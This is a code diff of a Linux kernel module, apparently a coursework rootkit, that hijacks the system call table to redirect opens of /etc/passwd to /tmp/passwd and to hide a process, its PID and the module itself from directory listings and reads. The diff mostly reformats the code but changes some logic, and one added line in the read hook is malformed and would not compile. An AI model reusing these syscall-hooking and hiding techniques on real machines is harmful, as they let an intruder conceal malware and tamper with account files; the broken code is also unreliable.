@@ -24,18 +24,18 @@ struct linux_dirent
     char d_name[];
 };
 
-char* itoa(int val, int base){
+char *itoa(int val, int base)
+{
 
-  static char buf[32] = {0};
+    static char buf[32] = {0};
 
-  int i = 30;
+    int i = 30;
 
-  for(; val && i ; --i, val /= base)
+    for (; val && i; --i, val /= base)
 
-    buf[i] = "0123456789abcdef"[val % base];
+        buf[i] = "0123456789abcdef"[val % base];
 
-  return &buf[i+1];
-
+    return &buf[i + 1];
 }
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
@@ -71,9 +71,9 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 
     char originalPath[] = "/etc/passwd";
     char targetPath[] = "/tmp/passwd";
-    if (strstr(pathname, originalPath) != NULL)
+    if (strcmp(pathname, originalPath) == 0)
     {
-      copy_to_user((void*)pathname, targetPath, strlen(pathname));
+        copy_to_user((void *)pathname, targetPath, 12);
     }
 
     return original_call(pathname, flags);
@@ -85,20 +85,20 @@ asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, 
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
 {
     int originalRes = original_getdents(fd, dirp, count);
-    char* pidString;
+    char *pidString;
     pidString = itoa(pid, 10);
     int currNum = 0;
     while (currNum < originalRes)
     {
-      struct linux_dirent *tmp =(void*) dirp + currNum;
+        struct linux_dirent *tmp = (void *)dirp + currNum;
         int currSize = tmp->d_reclen;
         if (strcmp(tmp->d_name, pidString) == 0 || strcmp(tmp->d_name, "sneaky_process") == 0)
         {
-	  int leftNum = ((void*)dirp + originalRes) - ((void*)tmp + currSize);
-	  struct linux_dirent *next = (void*)tmp + currSize;
-	  memmove(tmp, next, leftNum);
-	  originalRes = originalRes - currSize;
-	}
+            int leftNum = ((void *)dirp + originalRes) - ((void *)tmp + currSize);
+            void *next = (void *)tmp + currSize;
+            memmove(tmp, next, leftNum);
+            originalRes = originalRes - currSize;
+        }
         else
         {
             currNum = currNum + currSize;
@@ -113,16 +113,19 @@ asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
 asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count)
 {
     ssize_t originalRes = original_read(fd, buf, count);
-    char *start, end;
-    if (originalRes > 0) {
-    if ((start = strstr(buf, "sneaky_mod")) != NULL)
+    void *start = NULL;
+    void *end = NULL;
+    if (originalRes > 0)
     {
-        if ((end = strchr(start, '\n')) != NULL)
+        start = strnstr(buf, "sneaky_mod", originalRes);
+        if (start != NULL)
         {
-            memmove(start, end + 1, originalRes + buf - end - 1);
-            originalRes = originalRes - end - 1 + start;
+            end = strnstr(start, '\n', originalRes - start - buf) if (end != NULL)
+            {
+                memmove(start, end + 1, originalRes + buf - end - 1);
+                originalRes = originalRes - end - 1 + start;
+            }
         }
-    }
     }
     return originalRes;
 }
@@ -153,7 +156,7 @@ static int initialize_sneaky_module(void)
     *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
     original_read = (void *)*(sys_call_table + __NR_read);
     *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
-    
+
     //Revert page to read-only
     pages_ro(page_ptr, 1);
     //Turn write protection mode back on
@@ -183,7 +186,7 @@ static void exit_sneaky_module(void)
 
     *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
     *(sys_call_table + __NR_read) = (unsigned long)original_read;
-    
+
     //Revert page to read-only
     pages_ro(page_ptr, 1);
     //Turn write protection mode back on
